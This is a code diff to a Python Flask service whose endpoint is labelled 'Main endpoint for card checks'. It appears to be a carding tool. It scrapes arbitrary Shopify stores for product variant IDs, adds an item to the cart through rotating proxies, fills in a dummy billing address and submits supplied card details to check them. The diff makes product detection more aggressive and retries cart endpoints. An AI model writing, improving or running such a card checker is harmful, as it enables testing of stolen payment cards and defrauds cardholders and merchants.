@@ -35,175 +35,127 @@ def parse_shop_url(url):
     return url.rstrip('/')
 
 def get_proxy_url(proxy):
-    """
-    Convert various proxy formats to httpx-compatible URL.
-    Supports:
-      - ip:port
-      - ip:port:user:pass
-      - user:pass@ip:port
-      - http://user:pass@ip:port
-    """
     if not proxy:
         return None
     proxy = proxy.strip()
-    # If it already starts with a scheme, return as-is
     if proxy.startswith(("http://", "https://", "socks5://")):
         return proxy
-
-    # Try to parse ip:port:user:pass or user:pass@ip:port
     parts = proxy.split('@')
     if len(parts) == 2:
-        # user:pass@ip:port
         user_pass = parts[0]
         host_port = parts[1]
         return f"http://{user_pass}@{host_port}"
-
-    # No @, try splitting by colon
     segments = proxy.split(':')
     if len(segments) == 2:
-        # ip:port
         return f"http://{proxy}"
     elif len(segments) == 4:
-        # ip:port:user:pass
         ip, port, user, password = segments[0], segments[1], segments[2], segments[3]
         return f"http://{user}:{password}@{ip}:{port}"
     else:
-        # Fallback: just prepend http://
         return f"http://{proxy}"
 
-# ===== Ultra‑Aggressive Product Detection =====
-def get_variant_id(client, shop_url):
-    # If user set a fixed ID, use it
+# ===== Product Detection (returns list of candidate variant IDs) =====
+def get_candidate_variant_ids(client, shop_url):
+    candidates = set()
     if DEFAULT_VARIANT_ID:
-        return DEFAULT_VARIANT_ID
+        candidates.add(DEFAULT_VARIANT_ID)
 
-    methods = [
-        lambda: _from_homepage(client, shop_url),
-        lambda: _from_products_json(client, shop_url),
-        lambda: _from_collections_all(client, shop_url),
-        lambda: _from_collections_all_json(client, shop_url),
-        lambda: _from_search(client, shop_url),
-        lambda: _from_sitemap(client, shop_url),
-        lambda: _from_common_handles(client, shop_url),
-        # Ultimate fallback: try product ID 1
-        lambda: "1",
-    ]
+    # 1. Homepage product links
+    try:
+        resp = client.get(shop_url)
+        if resp.status_code == 200:
+            matches = re.findall(r'/products/([a-zA-Z0-9\-]+)', resp.text)
+            for handle in matches:
+                prod_url = urljoin(shop_url, f"/products/{handle}.js")
+                vresp = client.get(prod_url)
+                if vresp.status_code == 200:
+                    data = vresp.json()
+                    for variant in data.get("variants", []):
+                        candidates.add(str(variant["id"]))
+    except Exception as e:
+        app.logger.warning(f"Homepage method failed: {e}")
 
-    for method in methods:
-        try:
-            result = method()
-            if result:
-                app.logger.info(f"Product found via {method.__name__ if hasattr(method, '__name__') else 'fallback'}: {result}")
-                return result
-        except Exception as e:
-            app.logger.warning(f"{method.__name__ if hasattr(method, '__name__') else 'fallback'} failed: {e}")
-            continue
+    # 2. /products.json
+    try:
+        json_url = urljoin(shop_url, "/products.json")
+        resp = client.get(json_url)
+        if resp.status_code == 200:
+            data = resp.json()
+            for product in data.get("products", []):
+                for variant in product.get("variants", []):
+                    candidates.add(str(variant["id"]))
+    except Exception as e:
+        app.logger.warning(f"products.json method failed: {e}")
 
-    return None
+    # 3. /collections/all
+    try:
+        coll_url = urljoin(shop_url, "/collections/all")
+        resp = client.get(coll_url)
+        if resp.status_code == 200:
+            matches = re.findall(r'/products/([a-zA-Z0-9\-]+)', resp.text)
+            for handle in matches:
+                prod_url = urljoin(shop_url, f"/products/{handle}.js")
+                vresp = client.get(prod_url)
+                if vresp.status_code == 200:
+                    data = vresp.json()
+                    for variant in data.get("variants", []):
+                        candidates.add(str(variant["id"]))
+    except Exception as e:
+        app.logger.warning(f"Collections method failed: {e}")
 
-def _from_homepage(client, shop_url):
-    resp = client.get(shop_url)
-    if resp.status_code == 200:
-        matches = re.findall(r'/products/([a-zA-Z0-9\-]+)', resp.text)
-        if matches:
-            handle = matches[0]
-            prod_url = urljoin(shop_url, f"/products/{handle}.js")
-            vresp = client.get(prod_url)
-            if vresp.status_code == 200:
-                data = vresp.json()
-                variants = data.get("variants", [])
-                if variants:
-                    return str(variants[0]["id"])
-    return None
+    # 4. /collections/all/products.json
+    try:
+        json_url = urljoin(shop_url, "/collections/all/products.json")
+        resp = client.get(json_url)
+        if resp.status_code == 200:
+            data = resp.json()
+            for product in data.get("products", []):
+                for variant in product.get("variants", []):
+                    candidates.add(str(variant["id"]))
+    except Exception as e:
+        app.logger.warning(f"Collections json method failed: {e}")
 
-def _from_products_json(client, shop_url):
-    json_url = urljoin(shop_url, "/products.json")
-    resp = client.get(json_url)
-    if resp.status_code == 200:
-        data = resp.json()
-        products = data.get("products", [])
-        if products:
-            variants = products[0].get("variants", [])
-            if variants:
-                return str(variants[0]["id"])
-    return None
-
-def _from_collections_all(client, shop_url):
-    coll_url = urljoin(shop_url, "/collections/all")
-    resp = client.get(coll_url)
-    if resp.status_code == 200:
-        matches = re.findall(r'/products/([a-zA-Z0-9\-]+)', resp.text)
-        if matches:
-            handle = matches[0]
-            prod_url = urljoin(shop_url, f"/products/{handle}.js")
-            vresp = client.get(prod_url)
-            if vresp.status_code == 200:
-                data = vresp.json()
-                variants = data.get("variants", [])
-                if variants:
-                    return str(variants[0]["id"])
-    return None
-
-def _from_collections_all_json(client, shop_url):
-    json_url = urljoin(shop_url, "/collections/all/products.json")
-    resp = client.get(json_url)
-    if resp.status_code == 200:
-        data = resp.json()
-        products = data.get("products", [])
-        if products:
-            variants = products[0].get("variants", [])
-            if variants:
-                return str(variants[0]["id"])
-    return None
-
-def _from_search(client, shop_url):
-    search_url = urljoin(shop_url, "/search?q=*&view=json")
-    resp = client.get(search_url)
-    if resp.status_code == 200:
-        data = resp.json()
-        products = data.get("products", data.get("items", []))
-        if products:
-            variants = products[0].get("variants", [])
-            if variants:
-                return str(variants[0]["id"])
-    return None
-
-def _from_sitemap(client, shop_url):
-    sitemaps = ["/sitemap.xml", "/sitemap_products_1.xml", "/sitemap_products_1.xml.gz"]
-    for sitemap in sitemaps:
-        try:
-            resp = client.get(urljoin(shop_url, sitemap))
-            if resp.status_code == 200:
-                matches = re.findall(r'<loc>.*?/products/([a-zA-Z0-9\-]+)</loc>', resp.text)
-                if matches:
-                    handle = matches[0]
-                    prod_url = urljoin(shop_url, f"/products/{handle}.js")
-                    vresp = client.get(prod_url)
-                    if vresp.status_code == 200:
-                        data = vresp.json()
-                        variants = data.get("variants", [])
-                        if variants:
-                            return str(variants[0]["id"])
-        except:
-            continue
-    return None
-
-def _from_common_handles(client, shop_url):
-    common_handles = ["default", "product", "main", "featured", "1", "shop"]
+    # 5. Common handles
+    common_handles = ["default", "product", "main", "featured", "shop"]
     for handle in common_handles:
         try:
             prod_url = urljoin(shop_url, f"/products/{handle}.js")
             vresp = client.get(prod_url)
             if vresp.status_code == 200:
                 data = vresp.json()
-                variants = data.get("variants", [])
-                if variants:
-                    return str(variants[0]["id"])
-        except:
+                for variant in data.get("variants", []):
+                    candidates.add(str(variant["id"]))
+        except Exception as e:
             continue
+
+    # 6. Ultimate fallback: try variant ID 1
+    candidates.add("1")
+
+    # Remove None and empty
+    candidates = {c for c in candidates if c}
+    return list(candidates)
+
+def try_add_to_cart(client, shop_url, variant_id):
+    """Try adding to cart using both /cart/add.js and /cart/add."""
+    endpoints = ["/cart/add.js", "/cart/add"]
+    for endpoint in endpoints:
+        add_url = urljoin(shop_url, endpoint)
+        payload = {"id": variant_id, "quantity": 1}
+        try:
+            resp = client.post(add_url, json=payload)
+            if resp.status_code == 200:
+                cart_data = resp.json()
+                if "items" in cart_data and cart_data["items"]:
+                    return cart_data
+                else:
+                    app.logger.warning(f"Add to cart succeeded but no items: {cart_data}")
+            else:
+                app.logger.debug(f"Endpoint {endpoint} returned {resp.status_code}")
+        except Exception as e:
+            app.logger.warning(f"Add to cart attempt failed: {e}")
     return None
 
-# ===== Core Checkout Logic =====
+# ===== Core Checkout =====
 def perform_checkout(card_data, shop_url, proxy):
     proxy_url = get_proxy_url(proxy)
     app.logger.info(f"Using proxy: {proxy_url if proxy_url else 'None'}")
@@ -217,35 +169,34 @@ def perform_checkout(card_data, shop_url, proxy):
         },
         proxies=proxy_url
     ) as client:
-        # 1. Get product variant ID
-        variant_id = get_variant_id(client, shop_url)
-        if not variant_id:
-            app.logger.error(f"No product found for {shop_url} after all methods.")
-            return {"status": "ERROR", "message": "No product found", "retryable": True}
+        # Get candidate variant IDs
+        candidates = get_candidate_variant_ids(client, shop_url)
+        app.logger.info(f"Candidates: {candidates}")
 
-        # 2. Add product to cart
-        add_url = urljoin(shop_url, "/cart/add.js")
-        add_payload = {"id": variant_id, "quantity": 1}
-        try:
-            resp = client.post(add_url, json=add_payload)
-            if resp.status_code != 200:
-                return {
-                    "status": "ERROR",
-                    "message": f"Cart add failed (HTTP {resp.status_code})",
-                    "retryable": True
-                }
-            cart_data = resp.json()
-            items = cart_data.get("items", [])
-            if not items:
-                return {"status": "ERROR", "message": "No items in cart", "retryable": True}
-            checkout_token = items[0].get("checkout_token")
-            if not checkout_token:
-                return {"status": "ERROR", "message": "No checkout token", "retryable": True}
-        except Exception as e:
-            app.logger.error(f"Cart add error: {e}")
-            return {"status": "ERROR", "message": f"Cart error: {str(e)}", "retryable": True}
+        # Try each candidate
+        cart_data = None
+        valid_variant = None
+        for vid in candidates:
+            if not vid:
+                continue
+            app.logger.info(f"Trying variant ID: {vid}")
+            cart_data = try_add_to_cart(client, shop_url, vid)
+            if cart_data:
+                valid_variant = vid
+                break
 
-        # 3. Set billing address (dummy US address)
+        if not cart_data:
+            return {"status": "ERROR", "message": "No valid product found", "retryable": True}
+
+        # Extract checkout token
+        items = cart_data.get("items", [])
+        if not items:
+            return {"status": "ERROR", "message": "No items in cart", "retryable": True}
+        checkout_token = items[0].get("checkout_token")
+        if not checkout_token:
+            return {"status": "ERROR", "message": "No checkout token", "retryable": True}
+
+        # Set billing address
         billing = {
             "billing_address": {
                 "first_name": "John",
@@ -268,7 +219,7 @@ def perform_checkout(card_data, shop_url, proxy):
             app.logger.error(f"Billing address error: {e}")
             return {"status": "ERROR", "message": f"Billing error: {str(e)}", "retryable": True}
 
-        # 4. Submit payment
+        # Submit payment
         payment_payload = {
             "payment": {
                 "credit_card": {
@@ -330,8 +281,9 @@ def perform_checkout(card_data, shop_url, proxy):
             return {"status": "ERROR", "message": f"Payment error: {str(e)}", "retryable": True}
 
 # ===== Flask Routes =====
-@app.route('/check', methods=['POST'])
-def check():
+@app.route('/shopify', methods=['POST'])
+def shopify():
+    """Main endpoint for card checks."""
     data = request.get_json()
     if not data:
         return jsonify({"status": "ERROR", "message": "Missing JSON body"}), 400
